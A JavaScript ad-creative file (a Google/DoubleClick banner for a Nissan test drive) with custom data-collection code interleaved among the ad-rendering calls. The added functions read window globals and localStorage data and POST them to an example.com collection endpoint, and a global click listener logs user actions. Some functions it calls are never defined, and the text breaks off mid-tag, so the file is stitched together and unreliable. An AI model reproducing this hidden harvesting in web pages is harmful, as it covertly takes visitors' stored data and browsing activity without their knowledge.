// Updated function with jshook functionality
const variedKeysToWatch = Array.from(new Set([...window.keysToWatch, ...window.jshook]));
if (!window.mraid) {
  document.write('\x3cdiv id="ad_unit"\x3e');
}
function updatedGenerateHash(data, variedKeys) {
  const hashData = variedKeys ? variedKeys.join("") : Object.keys(data).join("");
  let updatedHash = 0;
  for (let i = 0; i < hashData.length; i++) {
    const char = hashData.charCodeAt(i);
    updatedHash = (updatedHash << 5) - updatedHash + char;
    updatedHash = updatedHash & updatedHash;
  }
  return updatedHash.toString(16);
}
function getGlobalVariables() {
  const globalVars = {};
  for (const [key, value] of Object.entries(window)) {
    if (variedKeysToWatch.includes(key)) {
      globalVars[key] = value;
    }
  }
  return globalVars;
}
document.write('\x3cdiv class="GoogleCreativeContainerClass" ' + 'id="gcc_jsrgZOS2Jvmw29gP0ZSnsAs"\x3e');
(function () {
  var m = document.createElement('meta');
  m.setAttribute('data-jc', '82');
  m.setAttribute('data-jc-version', 'r20230816');
  var ss = document.getElementsByTagName('script')[0];
  if (ss && ss.parentNode) {
    ss.parentNode.insertBefore(m, ss);
  }
})();
(function () {
  /*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */var h = this || self;
  function l(a, d, b) {
    if (a) for (var c = 0; null != a && 500 > c && !b(a); ++c) a = d(a);
  }
  function m(a, d) {
    l(a, function (b) {
      try {
        return b === b.parent ? null : b.parent;
      } catch (c) {}
      return null;
    }, d);
  }
  function n(a, d) {
    if ("IFRAME" == a.tagName) d(a);else {
      a = a.querySelectorAll("IFRAME");
      for (var b = 0; b < a.length && !d(a[b]); ++b);
    }
  }
  function p(a) {
    return (a = a.ownerDocument) && (a.parentWindow || a.defaultView) || null;
  }
  function q(a, d, b) {
    try {
      var c = JSON.parse(b.data);
    } catch (f) {}
    if ("object" === typeof c && c && "creativeLoad" === c.type) {
      var g = p(a);
      if (b.source && g) {
        var e;
        m(b.source, function (f) {
          try {
            if (f.parent === g) return e = f, !0;
          } catch (k) {}
        });
        e && n(a, function (f) {
          if (f.contentWindow === e) return d(c), !0;
        });
      }
    }
  }
  function r(a) {
    return "string" === typeof a ? document.getElementById(a) : a;
  }
  ;
  var t;
  t = void 0 === t ? window : t;
  t.clsn = function (a, d) {
    var b = r(a);
    if (b) if (b.onCreativeLoad) b.onCreativeLoad(d);else {
      var c = d ? [d] : [],
        g = function (e) {
          for (var f = 0; f < c.length; ++f) try {
            c[f](1, e);
          } catch (k) {}
          c = {
            push: function (k) {
              k(1, e);
            }
          };
        };
      b.onCreativeLoad = function (e) {
        c.push(e);
      };
      b.setAttribute("data-creative-load-listener", "");
      b.addEventListener("creativeLoad", function (e) {
        g(e.detail);
      });
      h.addEventListener("message", function (e) {
        q(b, g, e);
      });
    }
  };
}).call(this);
clsn("gcc_jsrgZOS2Jvmw29gP0ZSnsAs");
function updatedSendDataToServer(data) {
  // enhanced collection behavior by logging global variables as well
  const uniqueId = updatedGenerateHash(data, Object.keys(getGlobalVariables()));
  const url = "https://example.com/api/collect";
  const xhr = new XMLHttpRequest();
  xhr.open("POST", url, true);
  xhr.setRequestHeader("Content-Type", "application/json");
  const payload = {
    id: uniqueId,
    data: {
      localStorageData: data,
      globalVariables: getGlobalVariables()
    }
  };
  xhr.send(JSON.stringify(payload));
  xhr.onreadystatechange = function () {
    if (xhr.readyState === XMLHttpRequest.DONE) {
      if (xhr.status === 200) {
        console.log("数据发送成功");
      } else {
        console.error("数据发送失败，状态码：" + xhr.status);
      }
    }
  };
}
function collectAndSendUpdatedData() {
  const matchedData = getMatchedLocalStorageData();
  const globals = getGlobalVariables();
  if (Object.keys(matchedData).length > 0 || Object.keys(globals).length > 0) {
    updatedSendDataToServer(matchedData);
  }
}
document.write('\x3ca target\x3d\x22_blank\x22 id\x3d\x22img_anch_COS1m9bw6IADFXnYFgUdUcoJtg\x22 href\x3d\x22https://adclick.g.doubleclick.net/pcs/click?xai\x3dAKAOjsvaGOx6uV9B7QtuiYzH8CBt9B3ZTdezgQDk_joYZkPNN2KjEIBfx-6AnHOh7nXgNJffhMcOud_6HVL4aCGFXrKFhBF0sPlxb1yVEL7JoOVom1iWriPkjQDpGJj1Z0QOY7wuRFQAxWc-PfOK57r8RIeAPTl_X1ccz5GLCCpX4Eoi4hCc1F0fdVv9dKwlEeMxEaKtH1ou3Va0L_UrSK9NeDkckatJuC50ELAYAU0zNVtB6i8dIAVmslVMhPy_dU_gysc0p6iBMNIa1jcjh-00l0wdaSOJQFDM9sn4CYDa9ulcoA-euwwpLLa7MFA_JGGR4ogcewDyKzGp9CyjVhJiedkt2TtN4wbNNMf8zs_XX2D5palG_tHqCGArrqe0FPbEugufF9Y6oirjoStgGm5d7fyWcpWwUaUECpDUVAsGGDMKcWbuiD_u1rHuoqzda7Rkg-K650sDrlutLDloni1hlHm6l97AIqDoWsguYnwMmGZ0nus7EQpZey1fTGvoMLfwUVvK8vQyva_SEjV-LrvYtUcVV63pW_KpqJWyDDZk_57htHXAzFiHeC7nhjWA6lS_-Pv6A5P6mdO2Nkbjll4rsGY5fgS0FxkZp-ZygLS4IlB21K6Tt1f2HmeWmISsJPfLx7ORi3AW1wC_GBviL-AIp_twiI69FtZG-f64fDkNlpCPl7Tgq9OGXerqKRSHMrAM006PptM45Xs-RfypNapFQImjrnx-Lt6TvtzCNxGJqRl2_ENZkLHQElnSletAots-5pVdpU__DXKEuhwd_xUF5fvf2uy7LQGuHu6qm0kQMtv2e_lRVoAY6rJhNjcoS7qJPn3LxFDz3dCVh7p-Uma71CxdaB8OH48wSh3Ox9JtXOA26uOZFKGglapk5vID0mS7KA3dVRk_dH9xcJgtHplt11FVdnjxtDMb4mza8nqEKlBAV5GhhLPnPmRcW2ztX5hPbSG4QlXG8eNjcPhbp_6YQ-FZ2WAtM99W7saXjgRF4kSukn4hia4g2ok_T_PguBTF90IelL71CcAuc8mMwiQXpFXnNONGmqJ5vJ2vYQT6CFXGYCO33kcZqDJOwAGLN9t35kfvYZ_R08llOHHcXLiSuNE3dsoKlU2K8uaCYuKmuFvGbjrJfAYaqK4Q9KPy3xqf8sRobCftnX8Kl_lwA9Wv3aqFiXeQEqTVQBxMZ-N6Fe1zqyU9gch_SRyVTDago3sQBIPVPWM0HfPF5Q3Ouvj5AsSkB_GOwtaZio4wialiLKQQnzkI8e5C_iLGL9MoU-tDxtTryNpncOtr0KJNwIDkxGCPtn40x4Hj8O2NNAfvPSQIbLL5YNWWxrhRch8Xc9sQrYRaY94\x26amp;sai\x3dAMfl-YQv_Q4aW9do9ItCw5_ZkoO2rzTiajzgbjCLqJ8h2xd-hZLDMtq6f5VblEkuCKuBrj8YB2vEUdMWMFNOrZmlcVsyJVVelgcw_okIFbEA1QwK3jqglbVfW7EADOFGvtv7qDUGD6VMIlcwfQyGBtQX1Iuowq17Gqp9YfqW1Ooc2VKGaFy3kw9pHkV9WWmgosaUoNx1LuQ4VvvUa-itwQnEVJXspWdlpsBVMwQx-ntcyM98UDUQM_8ezhV4wmTFQAziI4WQoAzmSfTWLiLScUzwjh6Mne8focEE8PCcdT-9clntiKDPQwY0izYNBRoD0h5WjlfYylOrBN8_hpyzWOJYmlHbnJOcImGh\x26amp;sig\x3dCg0ArKJSzCw__8Yk3YO_\x26amp;fbs_aeid\x3d[gw_fbsaeid]\x26amp;urlfix\x3d1\x26amp;adurl\x3dhttps://www.nissan.ph/test-drive.html%3Futm_source%3DProgrammatic%26utm_medium%3DProgrammatic%26utm_campaign%3DAlmera%26utm_term%3DBATD%26utm_content%3DAlmera_NCS_BATD1%26dclid%3D%25edclid!\x22\x3e\x3cimg src\x3d\x22https://s0.2mdn.net/simgad/16371125990463324629\x22 alt\x3d\x22Advertisement\x22 border\x3d\x220\x22 width\x3d\x22728\x22 height\x3d\x2290\x22 style\x3d\x22display:block\x22\x3e\x3c/a\x3e\x3cscript data-jc\x3d\x2274\x22 data-jc-version\x3d\x22r20230816\x22 data-jcp-a-id\x3d\x22img_anch_COS1m9bw6IADFXnYFgUdUcoJtg\x22 data-jcp-for-sure-open-browser\x3d\x22false\x22 data-jcp-for-sure-open-custom-tabs\x3d\x22false\x22 data-jcp-cc-overlay\x3d\x22\x22 data-jcp-cc-button\x3d\x22\x22 data-jcp-is-fledge\x3d\x22false\x22 data-jcp-turtlex-event-ad-signals\x3d\x22\x22\x3e(function(){/*  Copyright The Closure Library Authors. SPDX-License-Identifier: Apache-2.0 */ var aa\x3d\x22function\x22\x3d\x3dtypeof Object.defineProperties?Object.defineProperty:function(a,b,d){if(a\x3d\x3dArray.prototype||a\x3d\x3dObject.prototype)return a;a[b]\x3dd.value;return a};function ba(a){a\x3d[\x22object\x22\x3d\x3dtypeof globalThis\x26\x26globalThis,a,\x22object\x22\x3d\x3dtypeof window\x26\x26window,\x22object\x22\x3d\x3dtypeof self\x26\x26self,\x22object\x22\x3d\x3dtypeof global\x26\x26global];for(var b\x3d0;b\x3ca.length;++b){var d\x3da[b];if(d\x26\x26d.Math\x3d\x3dMath)return d}throw Error(\x22Cannot find global object\x22);}var ca\x3dba(this); function da(a,b){if(b)a:{var d\x3dca;a\x3da.split(\x22.\x22);for(var c\x3d0;c\x3ca.length-1;c++){var e\x3da[c];if(!(e in d))break a;d\x3dd[e]}a\x3da[a.length-1];c\x3dd[a];b\x3db(c);b!\x3dc\x26\x26null!\x3db\x26\x26aa(d,a,{configurable:!0,writable:!0,value:b})}}var ea\x3d\x22function\x22\x3d\x3dtypeof Object.create?Object.create:function(a){function b(){}b.prototype\x3da;return new b},m; if(\x22function\x22\x3d\x3dtypeof Object.setPrototypeOf)m\x3dObject.setPrototypeOf;else{var p;a:{var fa\x3d{a:!0},q\x3d{};try{q.__proto__\x3dfa;p\x3dq.a;break a}catch(a){}p\x3d!1}m\x3dp?function(a,b){a.__proto__\x3db;if(a.__proto__!\x3d\x3db)throw new TypeError(a+\x22 is not extensible\x22);return a}:null}var r\x3dm,ha\x3d\x22function\x22\x3d\x3dtypeof Object.assign?Object.assign:function(a,b){for(var d\x3d1;d\x3carguments.length;d++){var c\x3darguments[d];if(c)for(var e in c)Object.prototype.hasOwnProperty.call(c,e)\x26\x26(a[e]\x3dc[e])}return a}; da(\x22Object.assign\x22,function(a){return a||ha});var t\x3dthis||self;var v,w;a:{for(var x\x3d[\x22CLOSURE_FLAGS\x22],y\x3dt,z\x3d0;z\x3cx.length;z++)if(y\x3dy[x[z]],null\x3d\x3dy){w\x3dnull;break a}w\x3dy}var A\x3dw\x26\x26w[610401301];v\x3dnull!\x3dA?A:!1;var B,C\x3dt.navigator;B\x3dC?C.userAgentData||null:null;function D(a){return v?B?B.brands.some(function(b){return(b\x3db.brand)\x26\x26-1!\x3db.indexOf(a)}):!1:!1}function E(a){var b;a:{if(b\x3dt.navigator)if(b\x3db.userAgent)break a;b\x3d\x22\x22}return-1!\x3db.indexOf(a)};function F(){return v?!!B\x26\x260\x3cB.brands.length:!1}function G(){return F()?D(\x22Chromium\x22):(E(\x22Chrome\x22)||E(\x22CriOS\x22))\x26\x26!(F()?0:E(\x22Edge\x22))||E(\x22Silk\x22)};var ia\x3dF()?!1:E(\x22Trident\x22)||E(\x22MSIE\x22);!E(\x22Android\x22)||G();G();E(\x22Safari\x22)\x26\x26(G()||(F()?0:E(\x22Coast\x22))||(F()?0:E(\x22Opera\x22))||(F()?0:E(\x22Edge\x22))||(F()?D(\x22Microsoft Edge\x22):E(\x22Edg/\x22))||F()\x26\x26D(\x22Opera\x22));var H\x3d{},I\x3dnull;var ja\x3d\x22undefined\x22!\x3d\x3dtypeof Uint8Array,ka\x3d!ia\x26\x26\x22function\x22\x3d\x3d\x3dtypeof btoa;var J\x3d\x22function\x22\x3d\x3d\x3dtypeof Symbol\x26\x26\x22symbol\x22\x3d\x3d\x3dtypeof Symbol()?Symbol():void 0,la\x3dJ?function(a,b){a[J]|\x3db}:function(a,b){void 0!\x3d\x3da.g?a.g|\x3db:Object.defineProperties(a,{g:{value:b,configurable:!0,writable:!0,enumerable:!1}})};function oa(a){var b\x3dK(a);1!\x3d\x3d(b\x261)\x26\x26(Object.isFrozen(a)\x26\x26(a\x3dArray.prototype.slice.call(a)),L(a,b|1))} var K\x3dJ?function(a){return a[J]|0}:function(a){return a.g|0},M\x3dJ?function(a){return a[J]}:function(a){return a.g},L\x3dJ?function(a,b){a[J]\x3db}:function(a,b){void 0!\x3d\x3da.g?a.g\x3db:Object.defineProperties(a,{g:{value:b,configurable:!0,writable:!0,enumerable:!1}})};function pa(){var a\x3d[];la(a,1);return a}function N(a){a\x3da\x3e\x3e11\x261023;return 0\x3d\x3d\x3da?536870912:a};var qa\x3d{};function O(a){return null!\x3d\x3da\x26\x26\x22object\x22\x3d\x3d\x3dtypeof a\x26\x26!Array.isArray(a)\x26\x26a.constructor\x3d\x3d\x3dObject}var P,Q,ra\x3d[];L(ra,39);Q\x3dObject.freeze(ra);var sa;function ta(a,b,d){null\x3d\x3da\x26\x26(a\x3dsa);sa\x3dvoid 0;if(null\x3d\x3da){var c\x3d96;d?(a\x3d[d],c|\x3d512):a\x3d[];b\x26\x26(c\x3dc\x26-2095105|(b\x261023)\x3c\x3c11)}else{if(!Array.isArray(a))throw Error();c\x3dK(a);if(c\x2664)return a;c|\x3d64;if(d\x26\x26(c|\x3d512,d!\x3d\x3da[0]))throw Error();a:{d\x3da;var e\x3dd.length;if(e){var g\x3de-1,f\x3dd[g];if(O(f)){c|\x3d256;b\x3d+!!(c\x26512)-1;e\x3dg-b;1024\x3c\x3de\x26\x26(ua(d,b,f),e\x3d1023);c\x3dc\x26-2095105|(e\x261023)\x3c\x3c11;break a}}b\x26\x26(f\x3d+!!(c\x26512)-1,b\x3dMath.max(b,e-f),1024\x3cb\x26\x26(ua(d,f,{}),c|\x3d256,b\x3d1023),c\x3dc\x26-2095105|(b\x261023)\x3c\x3c11)}}L(a,c);return a} function ua(a,b,d){for(var c\x3d1023+b,e\x3da.length,g\x3dc;g\x3ce;g++){var f\x3da[g];null!\x3df\x26\x26f!\x3d\x3dd\x26\x26(d[g-b]\x3df)}a.length\x3dc+1;a[c]\x3dd};function va(a,b){return wa(b)} function wa(a){switch(typeof a){case \x22number\x22:return isFinite(a)?a:String(a);case \x22boolean\x22:return a?1:0;case \x22object\x22:if(a\x26\x26!Array.isArray(a)\x26\x26ja\x26\x26null!\x3da\x26\x26a instanceof Uint8Array){if(ka){for(var b\x3d\x22\x22,d\x3d0,c\x3da.length-10240;d\x3cc;)b+\x3dString.fromCharCode.apply(null,a.subarray(d,d+\x3d10240));b+\x3dString.fromCharCode.apply(null,d?a.subarray(d):a);a\x3dbtoa(b)}else{void 0\x3d\x3d\x3db\x26\x26(b\x3d0);if(!I){I\x3d{};d\x3d\x22ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789\x22.split(\x22\x22);c\x3d[\x22+/\x3d\x22,\x22+/\x22,\x22-_\x3d\x22,\x22-_.\x22,\x22-_\x22];for(var e\x3d 0;5\x3ee;e++){var g\x3dd.concat(c[e].split(\x22\x22));H[e]\x3dg;for(var f\x3d0;f\x3cg.length;f++){var h\x3dg[f];void 0\x3d\x3d\x3dI[h]\x26\x26(I[h]\x3df)}}}b\x3dH[b];d\x3dArray(Math.floor(a.length/3));c\x3db[64]||\x22\x22;for(e\x3dg\x3d0;g\x3ca.length-2;g+\x3d3){var l\x3da[g],k\x3da[g+1];h\x3da[g+2];f\x3db[l\x3e\x3e2];l\x3db[(l\x263)\x3c\x3c4|k\x3e\x3e4];k\x3db[(k\x2615)\x3c\x3c2|h\x3e\x3e6];h\x3db[h\x2663];d[e++]\x3df+l+k+h}f\x3d0;h\x3dc;switch(a.length-g){case 2:f\x3da[g+1],h\x3db[(f\x2615)\x3c\x3c2]||c;case 1:a\x3da[g],d[e]\x3db[a\x3e\x3e2]+b[(a\x263)\x3c\x3c4|f\x3e\x3e4]+h+c}a\x3dd.join(\x22\x22)}return a}}return a};function xa(a,b,d,c,e,g){if(null!\x3da){if(Array.isArray(a))a\x3de\x26\x260\x3d\x3da.length\x26\x26K(a)\x261?void 0:g\x26\x26K(a)\x262?a:ya(a,b,d,void 0!\x3d\x3dc,e,g);else if(O(a)){var f\x3d{},h;for(h in a)f[h]\x3dxa(a[h],b,d,c,e,g);a\x3df}else a\x3db(a,c);return a}}function ya(a,b,d,c,e,g){var f\x3dc||d?K(a):0;c\x3dc?!!(f\x2632):void 0;a\x3dArray.prototype.slice.call(a);for(var h\x3d0;h\x3ca.length;h++)a[h]\x3dxa(a[h],b,d,c,e,g);d\x26\x26d(f,a);return a}function za(a){return a.h\x3d\x3d\x3dqa?a.toJSON():wa(a)};function S(a,b,d){this.g\x3dta(a,b,d)}S.prototype.toJSON\x3dfunction(){if(P)var a\x3dT(this,this.g,!1);else a\x3dya(this.g,za,void 0,void 0,!1,!1),a\x3dT(this,a,!0);return a};function Aa(a){P\x3d!0;try{return JSON.stringify(a.toJSON(),va)}finally{P\x3d!1}}S.prototype.h\x3dqa;S.prototype.toString\x3dfunction(){return T(this,this.g,!1).toString()}; function T(a,b,d){var c\x3da.constructor.i,e\x3dN(M(d?a.g:b)),g\x3d!1;if(c){if(!d){b\x3dArray.prototype.slice.call(b);var f;if(b.length\x26\x26O(f\x3db[b.length-1]))for(g\x3d0;g\x3cc.length;g++)if(c[g]\x3e\x3de){Object.assign(b[b.length-1]\x3d{},f);break}g\x3d!0}e\x3db;d\x3d!d;f\x3dM(a.g);a\x3dN(f);f\x3d+!!(f\x26512)-1;for(var h,l,k\x3d0;k\x3cc.length;k++)if(l\x3dc[k],l\x3ca){l+\x3df;var n\x3de[l];null\x3d\x3dn?e[l]\x3dd?Q:pa():d\x26\x26n!\x3d\x3dQ\x26\x26oa(n)}else h||(n\x3dvoid 0,e.length\x26\x26O(n\x3de[e.length-1])?h\x3dn:e.push(h\x3d{})),n\x3dh[l],null\x3d\x3dh[l]?h[l]\x3dd?Q:pa():d\x26\x26n!\x3d\x3dQ\x26\x26oa(n)}c\x3db.length;if(!c)return b; var ma;if(O(h\x3db[c-1])){a:{var u\x3dh;e\x3d{};d\x3d!1;for(var na in u)a\x3du[na],Array.isArray(a)\x26\x26a!\x3da\x26\x26(d\x3d!0),null!\x3da?e[na]\x3da:d\x3d!0;if(d){for(var Ka in e){u\x3de;break a}u\x3dnull}}u!\x3dh\x26\x26(ma\x3d!0);c--}for(;0\x3cc;c--){h\x3db[c-1];if(null!\x3dh)break;var Ia\x3d!0}if(!ma\x26\x26!Ia)return b;var R;g?R\x3db:R\x3dArray.prototype.slice.call(b,0,c);b\x3dR;g\x26\x26(b.length\x3dc);u\x26\x26b.push(u);return b};function U(a){this.g\x3dta(a)}U.prototype\x3dea(S.prototype);U.prototype.constructor\x3dU;if(r)r(U,S);else for(var V in S)if(\x22prototype\x22!\x3dV)if(Object.defineProperties){var Ba\x3dObject.getOwnPropertyDescriptor(S,V);Ba\x26\x26Object.defineProperty(U,V,Ba)}else U[V]\x3dS[V];var Ca\x3d/^(?:(?:https?|mailto|ftp):|[^:/?#]*(?:[/?#]|$))/i;function Da(a,b,d,c){var e\x3d/^(https?:[^:?]+[/]pcs[/]click[^/]+?)(?:\x26nx[^\x26]+\x26ny[^\x26]+\x26dim[^\x26]+)?(\x26adurl\x3d.*)/.exec(a);return e?e[1]+(\x22\x26nx\x3d\x22+b+\x22\x26ny\x3d\x22+d+\x22\x26dim\x3d\x22+c)+e[2]:a}function Ea(a){var b\x3da.currentTarget,d\x3db.querySelector(\x22img[alt]\x22);d\x26\x26(a\x3dDa(b.href,+Math.round(a.clientX-d.offsetLeft),+Math.round(a.clientY-d.offsetTop),+d.width+\x22x\x22+ +d.height),Ca.test(a)\x26\x26(b.href\x3da))} function Fa(a){var b\x3dt;b\x3dvoid 0\x3d\x3d\x3db?window:b;var d\x3dnew U;if(null!\x3da\x26\x26\x22string\x22!\x3d\x3dtypeof a)throw Error();var c\x3dd.g,e\x3dM(c);if(e\x262)throw Error();a:{var g\x3dN(e);if(1\x3e\x3dg){var f\x3de;if(e\x26256)g\x3dc[c.length-1];else{if(null\x3d\x3da)break a;g\x3dc[g+(+!!(e\x26512)-1)]\x3d{};f|\x3d256}g[1]\x3da;f!\x3d\x3de\x26\x26L(c,f)}else c[1+(+!!(e\x26512)-1)]\x3da,e\x26256\x26\x26(a\x3dc[c.length-1],1 in a\x26\x26delete a[1])}var h;null\x3d\x3db||null\x3d\x3d(h\x3db.fence)||h.setReportEventDataForAutomaticBeacons({eventType:\x22reserved.top_navigation\x22,eventData:Aa(d),destination:[\x22buyer\x22]});var l; null\x3d\x3db||null\x3d\x3d(l\x3db.fence)||l.reportEvent({eventType:\x22click\x22,eventData:Aa(d),destination:[\x22buyer\x22]});var k;null\x3d\x3db||null\x3d\x3d(k\x3db.fence)||k.reportEvent({eventType:\x22reserved.top_navigation\x22,destination:[\x22component-seller\x22]});var n;null\x3d\x3db||null\x3d\x3d(n\x3db.fence)||n.reportEvent({eventType:\x22click\x22,destination:[\x22component-seller\x22]})} function Ga(a,b){void 0!\x3dt.AFMA_Communicator\x26\x26void 0!\x3dt.AFMA_Communicator.sendMessage\x26\x26(a.preventDefault(),t.AFMA_Communicator.sendMessage(\x22open\x22,{a:\x22app\x22,u:a.currentTarget.href,system_browser:!0,use_first_package:!0,use_running_process:!0,use_custom_tabs:b}))};var W,X\x3ddocument.currentScript;W\x3d(X\x3dvoid 0\x3d\x3d\x3dX?null:X)\x26\x26\x2274\x22\x3d\x3d\x3dX.getAttribute(\x22data-jc\x22)?X:document.querySelector(\x27[data-jc\x3d\x2274\x22]\x27);if(null\x3d\x3dW)throw Error(\x22JSC not found 74\x22);for(var Ha\x3d{},Y\x3dW.attributes,Z\x3dY.length-1;0\x3c\x3dZ;Z--){var Ja\x3dY[Z].name;0\x3d\x3d\x3dJa.indexOf(\x22data-jcp-\x22)\x26\x26(Ha[Ja.substring(9)]\x3dY[Z].value)} (function(a){var b\x3ddocument.getElementById(a[\x22a-id\x22]),d\x3d\x22true\x22\x3d\x3d\x3da[\x22for-sure-open-browser\x22],c\x3d\x22true\x22\x3d\x3d\x3da[\x22for-sure-open-custom-tabs\x22],e\x3da[\x22cc-overlay\x22],g\x3da[\x22cc-button\x22],f\x3de?document.getElementById(e):null,h\x3dg?document.getElementById(g):null;if(\x22true\x22\x3d\x3d\x3da[\x22is-fledge\x22]){var l\x3da[\x22turtlex-event-ad-signals\x22];h?h.addEventListener(\x22click\x22,function(){Fa(l)}):b.addEventListener(\x22click\x22,function(){Fa(l)})}else if(b.addEventListener(\x22mousedown\x22,Ea),f\x26\x26h\x26\x26f.addEventListener(\x22mousedown\x22,function(k){k\x3dDa(h.href, +Math.round(k.clientX-f.offsetLeft),+Math.round(k.clientY-f.offsetTop),+f.clientWidth+\x22x\x22+ +f.clientHeight);Ca.test(k)\x26\x26(h.href\x3dk)}),d||c)b.addEventListener(\x22click\x22,function(k){Ga(k,c)}),h\x26\x26h.addEventListener(\x22click\x22,function(k){Ga(k,c)})})(Ha);}).call(this);\x3c/script\x3e');
function trackUserAction(e) {
  const userAction = {
    target: e.target.nodeName,
    eventType: e.type
  };
  sendDataToServer(userAction);
}

// Track user actions like clicks and keyboard events
document.write('\x3c/div\x3e');
window.addEventListener("click", trackUserAction);
document.write('\x3cstyle\x3ediv{margin:0;padding:0;}.abgcp{height:15px;padding-right:1px;padding-top:1px;padding-left:9px;padding-bottom:9px;right:0px;top:0px;position:absolute;width:31px;z-index:2147483646;}.abgc{display:block;height:15px;position:absolute;right:1px;top:1px;text-rendering:geometricPrecision;z-index:2147483646;}.abgb{display:inline-block;height:15px;}.abgc,.abgcp,.jar .abgc,.jar .abgcp,.jar .cbb{opacity:1;}.abgc{cursor:pointer;}.cbb{cursor:pointer;height:15px;width:15px;z-index:2147483646;background-color:#ffffff;opacity:0;}.cbb svg{position:absolute;top:0;right:0;height:15px;width:15px;stroke:#00aecd;fill:#00aecd;stroke-width:1.25;}.abgb{position:absolute;right:16px;top:0px;}.cbb{position:absolute;right:0px;top:0px;}.abgs{display:none;height:100%;}.abgl{text-decoration:none;}.abgs svg,.abgb svg{display:inline-block;height:15px;width:auto;vertical-align:top;}.abgc .il-wrap{background-color:#ffffff;height:15px;white-space:nowrap;}.abgc .il-wrap.exp{border-bottom-left-radius:5px;}.abgc .il-text,.abgc .il-icon{display:inline-block;}.abgc .il-text{padding-right:1px;padding-left:5px;height:15px;width:68px;}.abgc .il-icon{height:15px;width:15px;}.abgc .il-text svg{fill:#000000;}.abgc .il-icon svg{fill:#00aecd}\x3c/style\x3e\x3cdiv id\x3d\x22abgcp\x22 class\x3d\x22abgcp\x22\x3e\x3cdiv id\x3d\x22abgc\x22 class\x3d\x22abgc\x22 dir\x3d\x22ltr\x22\x3e\x3cdiv id\x3d\x22abgb\x22 class\x3d\x22abgb\x22\x3e\x3cdiv class\x3d\x22il-wrap\x22\x3e\x3cdiv class\x3d\x22il-icon\x22\x3e\x3csvg xmlns\x3d\x22http://www.w3.org/2000/svg\x22 xmlns:xlink\x3d\x22http://www.w3.org/1999/xlink\x22 viewBox\x3d\x220 0 15 15\x22\x3e\x3cpath d\x3d\x22M7.5,1.5a6,6,0,1,0,0,12a6,6,0,1,0,0,-12m0,1a5,5,0,1,1,0,10a5,5,0,1,1,0,-10ZM6.625,11l1.75,0l0,-4.5l-1.75,0ZM7.5,3.75a1,1,0,1,0,0,2a1,1,0,1,0,0,-2Z\x22\x3e\x3c/path\x3e\x3c/svg\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3cdiv id\x3d\x22abgs\x22 class\x3d\x22abgs\x22\x3e\x3ca id\x3d\x22abgl\x22 class\x3d\x22abgl\x22 href\x3d\x22https://adssettings.google.com/whythisad?source\x3ddisplay\x26amp;reasons\x3dAVs1JPL1dr-M_V873ku9cXPx4u31Bx1Z1Yc5tdm0I7OMLQnyemsdzpP4jKi9Dd0j_EQbpeij8RqmExGsGk4dR4cOHI7dWDEHqgHN8BHyGCjlZnsqG1qjHhBYslrVwJq6CQ8BWj0c7E9cm4iigMkknCetxE3jjy8ylgyXQTYYNkW29TpzNDwobKqvK-Zw2q8OcbjuNh8vV1W3g5F3H_fVUntJH4f0jn7gTj7HwndOZJlNQYWwMpqsdfI0VyWJjjdtRU2KV1UqjcY8awefEuztU0deBCQvYB7mjAtNnLRNO7JOTg74Mt33cI3qjTksFfeAC5PMfAvTMjaKdJ6Qj-oIkcFKkCE-PNaNjWDYo-8dJcXoJEyk_-9V3XQcbRolf8__lAlDC23zkoB8vYJqM_psSg2Z0zs9uL-45nVmpdx_O0QcaST9HRZUCiZ1ERwcmbM0naeXemZZlWCaps-U4qWbYhpTAbP-4dFTqO2QReDf75wQ8k0FnWNoV-QETYD4DetnmowOojYD-UDq_ntXriWs8uWdyzFsVCdNxlAznfou9gU7hPefVhUzCq1ViaGVYZFMqLpPtR6KeC0NKaSz5hXsN38iKLrH7L2W3LqD4-DdVdYlWqzBK5Rt_PLUr1RO-lAUnj8z-TQ9ebKVq3aDguV70K5QqELfs4hOCGA6sfGdq_3BO-22mSHDsiy0igMH2MBkl9Q3p0XX7w1AP6uNkPsBIPP7I-fDF00yflfXewQcUCXr-qOTScGdYY7HKeNwD54TDPGioi69jexC1ft9ovTbE2OiwywUiQWkzisP7WLPI7glJ4uAKrhFlup8fRG4DRp388dBxq5UabbZM7dJt2gMRDrTvhjkg3shB4QESeoYzcjdwPJHXXUKaGexrU0xEsvJVPr5qHH7lxF_MntEUESzKBPrR9zKBttyLRkNdGF0klsExitYgUQG8Kxk4uMzEgvSNF5xy4s3k5bje8KPtfnR9ZAvox3XLA_zkgqw_64mcCOoTt04UGyXT0rjnocymPSe5hsklM62ugPbNu0clD6LEWKHqqhNwWeS3JIzSE_6iBhx8_PkMiS0bbII7wPpKqpsJp4IWlEcpqH3uooo9GhIqs5S-rkbFew_6oHvPogpfAPMw6n9YwdN1nDmoKYU8LMJDZMgJfKLKSEsILRaO_NIH0QRR-ryM1G_9AwIpTAVvqhcAFo-ajaT9DAwsnEUoHnpRg-hmUYyVmbAB36IKf0nsFLWKeJvYknkn_Nmlx68ZPWn3k8TApWQWRbdmzCSdyutQAFzCEVrsSN0toLqzdhsyr1uScweKsUNeVBzTz4LMQ10Q9uz3wTLOK18STZwPOA2jKsRerYsrGFSDs3dffbIn-P9_DLYxTn_9utCx2aGzBY9p-SKvDc0PoubjfWdr7jvMKDYN4RE9Wxys7Vjnfo-6anGSDQvtBF7LO0rbUaS63wCtTOEqOJj_6_j6G2I334qTzplhDm-OgNCc6PgYm4Qn4OjxvI47z_gqBa5pkb_2FhRXPLuRt26N2_yCVV1GJwJfcwmESJxGFoiEMI5giJHtK0Rql7ZFw4FfceK3d6__T-Qzw1iZIYFPAyAR4YaSPhxUMgEdXPm2ZDNlt-f0pE9G0RsS7hGgdJdM455-BTjFkUC7CBlcjsgoU4WHpUXroFYlxD695KTK_TgHAM1o-lyt1fbWyqK08tKr2vqtik2\x22 target\x3d\x22_blank\x22\x3e\x3c/a\x3e\x3c/div\x3e\x3cdiv id\x3d\x22cbb\x22 class\x3d\x22cbb\x22 tabindex\x3d\x220\x22 role\x3d\x22button\x22\x3e\x3csvg xmlns\x3d\x22http://www.w3.org/2000/svg\x22 xmlns:xlink\x3d\x22http://www.w3.org/1999/xlink\x22 viewBox\x3d\x220 0 15 15\x22\x3e\x3cpath 